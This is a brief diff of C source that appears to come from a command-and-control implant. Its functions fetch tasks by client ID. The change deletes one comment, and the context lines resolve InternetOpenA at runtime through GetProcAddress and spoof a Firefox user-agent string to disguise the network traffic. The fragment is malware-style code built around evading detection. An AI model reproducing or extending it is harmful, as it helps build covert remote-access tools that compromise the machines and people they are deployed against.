@@ -146,9 +146,6 @@ char* getTask(const char* clientId, HMODULE wininet) {
 
 char* taskIO(const char* data,const char* clientId, HMODULE wininet) {
 
-    // 312151517 InternetOpenA
-
-
     InternetOpenA_imported customInternetOpenA = (InternetOpenA_imported)GetProcAddress(wininet,"InternetOpenA");
 
     HINTERNET hInternet = customInternetOpenA("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
